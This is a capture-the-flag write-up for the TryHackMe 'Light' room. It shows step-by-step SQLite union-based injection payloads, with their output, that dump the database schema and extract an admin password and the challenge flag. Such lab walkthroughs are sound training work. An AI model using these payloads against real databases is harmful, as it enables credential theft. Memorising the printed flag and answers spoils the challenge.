---
title: "TryHackMe - Light"
date: 2025-02-04 22:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [sql, sql incjection, sqlite, payloads, union-based injection]

---

# Introduction

In [this CTF](https://tryhackme.com/room/lightroom), I do not need to use Nmap scanning because the creator clearly states that I can connect to the database via netcat on port 1337.


```console
$ nc 10.10.10.30 1337     
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: 
```

I notice that the login is getting stuck in a loop. Knowing the CTF description, I understand that this challenge is related to databases. I decide to attempt an SQL injection using [known payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md). I'll start with the simplest payload:  ' .

```console
Please enter your username: '
Error: unrecognized token: "''' LIMIT 30"
Please enter your username: 
```

I encountered an error about an unrecognized token. I try using additional methods from the list to extract anything from the database. I decide to use various UNION SELECT techniques, encountering various errors thrown by the database, such as:
```console
Ahh there is a word in there I don't like :(
```
or
```console
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```

The first significant change I encountered was during the following variation of the UNION SELECT query:

```console
Please enter your username: ' Union Select 1 '
Password: 1
Please enter your username: 
``` 

Knowing the working union-based payload, I can proceed with further exploration of the database. After countless attempts, I finally manage to determine the version of the database using the command:

```console
Please enter your username: ' Union Select sqlite_version() '
Password: 3.31.1
Please enter your username: 
```
Knowing the database version, I can focus on existing payloads for SQLite 3.31.1. I search the web for this purpose and come across this list: [SQLite Injection Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md).

I use the following query to determine the structure of the database:

```console
Please enter your username: ' Union Select group_concat(sql) FROM sqlite_master '
Password: CREATE TABLE usertable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER),CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
Please enter your username: 
```

With this information, I can proceed to create a query that will allow me to extract the **username** and **password** from the database. I do this using the following queries:


```console
lease enter your username: ' Union Select group_concat(username) FROM admintable '
Password: TryHackMeAdmin,flag
Please enter your username: ' Union Select group_concat(password) FROM admintable '
Password: mamZtAuMlrsEy5bp6q17,THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```

This way, I obtained the username, password, and the flag needed to complete the CTF.